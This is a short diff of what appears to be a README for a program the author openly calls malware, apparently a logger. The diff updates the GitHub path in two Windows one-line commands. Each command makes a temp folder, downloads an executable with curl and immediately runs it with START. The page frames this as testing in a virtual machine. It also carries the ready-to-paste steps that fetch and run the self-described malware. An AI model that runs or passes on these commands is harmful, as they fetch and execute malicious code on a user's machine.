@@ -11,7 +11,7 @@
 #### In order to test the malware in your virtual machine, simply install and run the malware or type the following command in the command prompt 
 
 #### log_v1.1.exe
-`mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/scripts-apps/blob/main/log_v1.1.exe; START C:/tempapp/log.exe;`
+`mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/Log/blob/main/log_v1.1.exe; START C:/tempapp/log.exe;`
 
 #### log.exe
-`mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/scripts-apps/blob/main/log.exe; START C:/tempapp/log.exe;`
+`mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/Log/blob/main/log.exe; START C:/tempapp/log.exe;`
